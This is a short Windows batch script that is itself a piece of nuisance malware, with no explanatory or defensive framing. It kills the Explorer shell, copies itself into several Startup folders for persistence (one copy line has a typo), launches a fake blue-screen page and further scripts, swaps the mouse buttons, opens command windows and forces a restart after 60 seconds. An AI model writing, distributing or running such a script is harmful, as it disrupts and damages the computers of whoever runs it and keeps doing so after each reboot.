@echo off
taskkill /f /im explorer.exe
copy %0 "%homedrive%%homepath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy %0 "%homedrive%%homepath%\Startm~1\Programme\Autostart\"
copy 0% "%systemdrive%\Documents and Settings\All Users\Start Menu\Programs\Startup"
start bsod.hta
Rundll32 user32, SwapMouseButton
start l.vbs
start song.mp3
start spam1.bat
start Start2.bat
cd C:\Windows\System32
start cmd.exe
SHUTDOWN -r -t 60
